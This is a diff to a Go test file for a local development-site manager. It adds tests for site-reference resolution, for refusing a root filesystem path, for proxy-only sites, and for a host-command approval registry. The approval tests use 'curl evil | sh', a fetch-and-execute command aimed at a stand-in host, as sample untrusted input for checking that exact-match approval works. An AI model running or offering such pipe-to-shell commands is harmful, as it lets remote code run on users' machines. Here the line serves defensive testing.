@@ -12,6 +12,35 @@ func setDataDir(t *testing.T) {
 	t.Setenv("XDG_DATA_HOME", t.TempDir())
 }
 
+// ResolveSiteRef and FindSiteByRef must accept either the site name or any of
+// its domains, and leave an unknown reference untouched so callers still error.
+func TestResolveSiteRef(t *testing.T) {
+	setDataDir(t)
+	if err := AddSite(Site{Name: "astrolov", Domains: []string{"astrolov.test", "www.astrolov.test"}, Path: "/srv/astrolov"}); err != nil {
+		t.Fatal(err)
+	}
+
+	cases := map[string]string{
+		"astrolov":          "astrolov",     // name passes through
+		"astrolov.test":     "astrolov",     // primary domain resolves to the name
+		"www.astrolov.test": "astrolov",     // secondary domain too
+		"unknown.test":      "unknown.test", // unknown stays as-is
+		"":                  "",
+	}
+	for in, want := range cases {
+		if got := ResolveSiteRef(in); got != want {
+			t.Errorf("ResolveSiteRef(%q) = %q, want %q", in, got, want)
+		}
+	}
+
+	if s, err := FindSiteByRef("astrolov.test"); err != nil || s.Name != "astrolov" {
+		t.Errorf("FindSiteByRef(domain) = %+v, %v", s, err)
+	}
+	if _, err := FindSiteByRef("nope.test"); err == nil {
+		t.Error("FindSiteByRef of an unknown ref should error")
+	}
+}
+
 // ── AddSite / LoadSites ───────────────────────────────────────────────────────
 
 func TestAddSite_Basic(t *testing.T) {
@@ -49,6 +78,21 @@ func TestAddSite_RejectsUnitInjectionNames(t *testing.T) {
 	// A clean name still works.
 	if err := AddSite(Site{Name: "myapp", Domains: []string{"myapp.test"}, Path: "/srv/myapp"}); err != nil {
 		t.Errorf("AddSite with clean name should succeed: %v", err)
+	}
+}
+
+// A site at the filesystem root would be bind-mounted as /:/:rw into every
+// container, shadowing its rootfs so it cannot start (issue #884). AddSite must
+// refuse it.
+func TestAddSite_RejectsFilesystemRoot(t *testing.T) {
+	setDataDir(t)
+	for _, path := range []string{"/", "//", "/."} {
+		if err := AddSite(Site{Name: "root", Domains: []string{"root.test"}, Path: path}); err == nil {
+			t.Errorf("AddSite with path %q should have been rejected", path)
+		}
+	}
+	if err := AddSite(Site{Name: "ok", Domains: []string{"ok.test"}, Path: "/srv/ok"}); err != nil {
+		t.Errorf("AddSite with a real path should succeed: %v", err)
 	}
 }
 
@@ -615,6 +659,25 @@ func TestIsHostProxy_False(t *testing.T) {
 	}
 }
 
+func TestIsProxyOnly(t *testing.T) {
+	cases := []struct {
+		name string
+		site Site
+		want bool
+	}{
+		{"proxy with no command", Site{HostPort: 3000}, true},
+		{"proxy with a supervised command", Site{HostPort: 3000, HostCommand: "npm run dev"}, false},
+		{"not a proxy site", Site{PHPVersion: "8.4"}, false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := tc.site.IsProxyOnly(); got != tc.want {
+				t.Errorf("IsProxyOnly() = %v, want %v", got, tc.want)
+			}
+		})
+	}
+}
+
 func TestSaveLoad_HostProxy_RoundTrip(t *testing.T) {
 	setDataDir(t)
 
@@ -745,4 +808,48 @@ func searchString(s, substr string) bool {
 		}
 	}
 	return false
+}
+
+// ── ApprovedCommands (issue #692) ─────────────────────────────────────────────
+
+func TestApproveSiteCommand_RoundTrip(t *testing.T) {
+	setDataDir(t)
+	// HostCommandAllowed reads the global config, so the config dir needs
+	// isolating too or the test reads (and can migrate) the real one.
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	invalidateGlobalCache()
+	t.Cleanup(invalidateGlobalCache)
+	if err := AddSite(Site{Name: "acme", Domains: []string{"acme.test"}, Path: "/srv/acme"}); err != nil {
+		t.Fatalf("AddSite: %v", err)
+	}
+
+	// Unknown command is not approved; disabled is off by default.
+	if allowed, disabled := HostCommandAllowed("acme", "curl evil | sh"); allowed || disabled {
+		t.Fatalf("fresh command should be neither allowed nor disabled, got allowed=%v disabled=%v", allowed, disabled)
+	}
+
+	if err := ApproveSiteCommand("acme", "curl evil | sh"); err != nil {
+		t.Fatalf("ApproveSiteCommand: %v", err)
+	}
+	if allowed, _ := HostCommandAllowed("acme", "curl evil | sh"); !allowed {
+		t.Error("command should be allowed after approval (persisted to the registry)")
+	}
+	// A different command string is still not approved (exact-match keying).
+	if allowed, _ := HostCommandAllowed("acme", "curl evil | sh --force"); allowed {
+		t.Error("a changed command must re-prompt, not inherit approval")
+	}
+
+	site, err := FindSite("acme")
+	if err != nil || site == nil {
+		t.Fatalf("FindSite: %v", err)
+	}
+	if !site.CommandApproved("curl evil | sh") {
+		t.Error("CommandApproved should report the persisted approval")
+	}
+	// Idempotent: approving again does not duplicate.
+	_ = ApproveSiteCommand("acme", "curl evil | sh")
+	site, _ = FindSite("acme")
+	if len(site.ApprovedCommands) != 1 {
+		t.Errorf("approval must be idempotent, got %v", site.ApprovedCommands)
+	}
 }
